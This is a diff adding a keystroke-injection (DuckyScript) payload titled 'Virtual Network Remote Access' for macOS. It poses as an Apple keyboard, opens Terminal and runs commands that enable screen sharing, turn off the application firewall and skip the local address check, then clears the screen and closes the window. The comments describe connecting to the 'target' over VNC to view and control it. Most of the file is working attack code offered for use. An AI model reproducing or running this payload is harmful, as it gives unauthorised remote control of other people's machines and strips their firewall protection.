@@ -1,0 +1,52 @@
+REM VNC is a technology that allows you to remotely control another computer. 
+REM In this case, if the VNC server is started on a Mac, you can view 
+REM and control that Mac from another computer using a VNC viewer application.
+
+
+
+REM This script disables the firewall
+REM disable the local address check for Screen Sharing
+REM and enables screen sharing via sudo command (must know password Trying to find a workaround)
+
+
+REM Now you can use your local computer to tap into the target
+REM you can run the command open vnc://target_ip_address
+REM replace "target_ip_address" with the actual I.p. of the remote MacOs
+
+REM VNC Viewer should establish a connection to the target machine, 
+REM you should be able to see and control the remote desktop of the target machine on your computer.
+
+REM Note that the specific command and package name may vary 
+REM based on the version of Homebrew and RealVNC available at the time of installation.
+
+
+REM Author: Narsty
+REM Title: Virtual Network Remote Access
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist
+DELAY 2000
+ENTER
+DELAY 8000
+STRING /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
+DELAY 3000
+ENTER
+DELAY 500
+STRING defaults write com.apple.ScreenSharing skipLocalAddressCheck -bool true
+DELAY 3000
+ENTER 
+DELAY 500
+STRING clear
+DELAY 500
+GUI w
+
